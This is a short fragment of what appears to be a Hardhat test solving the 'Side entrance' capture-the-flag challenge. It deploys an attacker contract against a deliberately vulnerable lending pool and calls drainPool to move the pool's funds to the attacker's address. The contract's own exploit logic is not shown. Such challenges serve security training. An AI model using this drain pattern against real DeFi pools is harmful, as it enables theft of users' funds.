...
describe("[Challenge] Side entrance", function () {
  ...
  it("Exploit", async function () {
    const SideEntraceAttacker = await ethers.getContractFactory(
      "SideEntraceAttacker",
      attacker
    );
    const sideEntraceAttacker = await SideEntraceAttacker.deploy(
      this.pool.address
    );

    await sideEntraceAttacker.drainPool(attacker.address);
  });
